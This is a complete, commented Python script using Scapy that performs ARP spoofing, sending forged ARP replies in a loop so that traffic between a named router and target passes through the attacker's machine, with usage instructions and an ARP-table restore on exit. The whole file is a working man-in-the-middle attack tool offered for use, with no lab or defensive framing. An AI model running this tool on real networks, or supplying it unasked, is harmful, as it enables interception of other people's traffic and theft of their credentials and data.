###########################################
# Script Name : ARP Spoofer
# Description : This script performs ARP spoofing to intercept network traffic between a target and a router. It continuously sends malicious ARP packets to trick devices into sending traffic through the attacker's machine. The script also restores the original ARP table upon exit.
###########################################


import scapy.all as scapy  # Import Scapy for packet crafting and network interaction
import sys  # Import sys to handle command-line arguments
import time  # Import time for sleep delays
import os  # Import os to check for root privileges


def get_mac_address(ip_address):
    # Function to get the MAC address of a given IP using ARP requests.

    broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')  # Broadcast request
    arp_layer = scapy.ARP(pdst=ip_address)  # ARP request for the given IP
    get_mac_packet = broadcast_layer / arp_layer  # Combine layers into one packet
    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]  # Send packet and get response

    if answer:  # If a response is received
        return answer[0][1].hwsrc  # Extract MAC address from response
    else:
        print(f"[ERROR] No response from {ip_address}. Check if the IP is correct and reachable.")
        sys.exit(1)  # Exit if MAC address retrieval fails


def spoof(route_ip, target_ip, router_mac, target_mac):
    # Function to send spoofed ARP packets to trick target and router.

    packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=route_ip, psrc=target_ip)  # Fake router to target
    packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=route_ip)  # Fake target to router

    scapy.send(packet1, verbose=False)  # Send packet 1
    scapy.send(packet2, verbose=False)  # Send packet 2


def restore_arp(target_ip, router_ip, target_mac, router_mac):
    # Function to restore original ARP table by sending correct ARP responses.

    print("\n[INFO] Restoring ARP tables...")
    packet1 = scapy.ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=router_ip, hwsrc=router_mac)
    packet2 = scapy.ARP(op=2, pdst=router_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=target_mac)

    for _ in range(5):  # Send multiple packets to ensure restoration
        scapy.send(packet1, verbose=False)
        scapy.send(packet2, verbose=False)
        time.sleep(1)  # Small delay between packets


if __name__ == "__main__":
    # Check if the script is run as root (ARP spoofing requires root privileges)
    if os.geteuid() != 0:
        print("[ERROR] Please run as root (use sudo).")
        sys.exit(1)

    # Ensure correct number of arguments are provided
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} [router_ip] [target_ip]")
        sys.exit(1)

    target_ip = sys.argv[2]  # Get target IP from command-line argument
    router_ip = sys.argv[1]  # Get router IP from command-line argument

    try:
        target_mac = get_mac_address(target_ip)  # Get target MAC address
        router_mac = get_mac_address(router_ip)  # Get router MAC address

        print("[INFO] Starting ARP spoofing... Press Ctrl+C to stop.")

        while True:
            spoof(router_ip, target_ip, router_mac, target_mac)  # Continuously send spoofed packets
            time.sleep(2)  # Sleep to avoid flooding the network too quickly

    except KeyboardInterrupt:
        restore_arp(target_ip, router_ip, target_mac, router_mac)  # Restore ARP table on exit
        print("[INFO] ARP Spoofer stopped. Network restored.")
        sys.exit(0)

